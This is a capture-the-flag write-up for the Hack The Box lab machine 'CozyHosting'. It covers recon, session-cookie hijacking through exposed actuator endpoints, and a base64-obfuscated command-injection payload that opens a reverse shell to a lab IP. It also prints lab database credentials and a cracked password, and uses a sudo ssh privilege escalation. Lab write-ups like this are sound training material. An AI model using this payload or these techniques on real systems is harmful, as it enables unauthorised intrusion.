# CozyHosting (Easy)

![image](https://github.com/JefJacobs00/writeups/assets/43653885/0e4dc31a-ab63-448c-b7bf-6eafc355715d)

## Recon
### Nmap portscan

![image](https://github.com/JefJacobs00/writeups/assets/43653885/3ad04db2-ff2f-46d5-8e71-67a838d5c909)

The box has an open http and ssh service. We see that the http service redirects to "cozyhosting.htb". To access the site we need to add this to the /etc/hosts file with the corresponding ipaddress.

### Webserivce recon

The next step is to search trough the webapplication for vulnerabilities. We can use gobuster to search for available endpoints during the gobuster scan we can also checkout the site itself.

Gobuster finds a login and admin page. 

![image](https://github.com/JefJacobs00/writeups/assets/43653885/9b84ff13-ac35-4115-b9af-08c11655a442)

We also run a bigger search with dirsearch:

![image](https://github.com/JefJacobs00/writeups/assets/43653885/0502985e-c94b-4529-a13f-6ae50a77e6b5)

When we try to access the admin page we get a 401 (unathorised) and we get redirected to the login page. We try if SQLmap can get us somewhere on this page. This takes a while so we wait lets checkout if [hacktrics](https://book.hacktricks.xyz/pentesting-web/login-bypass) has any tips on how to get past the login page. hacktricks mentions to check if there is a remember me option. This is the case, this might allow us to use a session of a different user with access. From the dirsearch scan we found the page /actuator/sessions this page gives a couple of session ids: 

{
"E1A5A3A6778ADB55DBFA378AD0AB7354":"UNAUTHORIZED",
"8BE8064ACAC4926BE4FEB88BB5AE51DA":"kanderson",
"6113EB51B6B91DCC48C32B5011FE3B99":"UNAUTHORIZED",
"216136184FF0A10378CB091EE802718A":"kanderson",
"C9CCE6A596277216FD58C694BAAE212B":"UNAUTHORIZED"
}

two of these are not UNauthorized and belong to kanderson: 

216136184FF0A10378CB091EE802718A
8BE8064ACAC4926BE4FEB88BB5AE51DA

By changing the cookie we get access to a admin dashboard

![image](https://github.com/JefJacobs00/writeups/assets/43653885/a6313337-ef37-4f02-8702-ef2699af66e3)


## Foothold

At the bottom of the admin dashbord there is a box that allowes us to connect using ssh. However this does not get us get onto the box. In burpsuite we use the payload `{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvOTAwMSAwPiYx}|{base64,-d}|bash|` to get a reverse shell. 

![image](https://github.com/JefJacobs00/writeups/assets/43653885/8d9dc9e3-1aba-4834-8f76-dd9d4f5f814e)

We see that there is a user josh and a user prostgress that has access to the box. In the home folder we find a jar file that we download onto our machine and unzip. In the application.properties file we find the db credentials with user postgres and the password Vg&nvzAQ7XxR. 

![image](https://github.com/JefJacobs00/writeups/assets/43653885/8b5c8d0f-40c1-46cd-b2ee-86ac90fd4081)

We put these hashes into john to find the cleartext. From here we find that the admin has the password manchesterunited.

![image](https://github.com/JefJacobs00/writeups/assets/43653885/c789d395-e323-49a4-a058-a045666c988f)

We try to log onto the site using these credentials, this gives an error on the admin page. So we attemt to ssh josh@cozyhosting.htb with the password, this gives us the foothold!

## PE

For priv esc we check the sudo rights for the user, here we find that josh can use ssh with sudo. We look up if [gtfo bins](https://gtfobins.github.io/gtfobins/ssh/) has any tricks for this and they do. We copy paste the payload and get root access!

![image](https://github.com/JefJacobs00/writeups/assets/43653885/22801ab9-ec5d-45ab-96cc-13c52027a1ae)













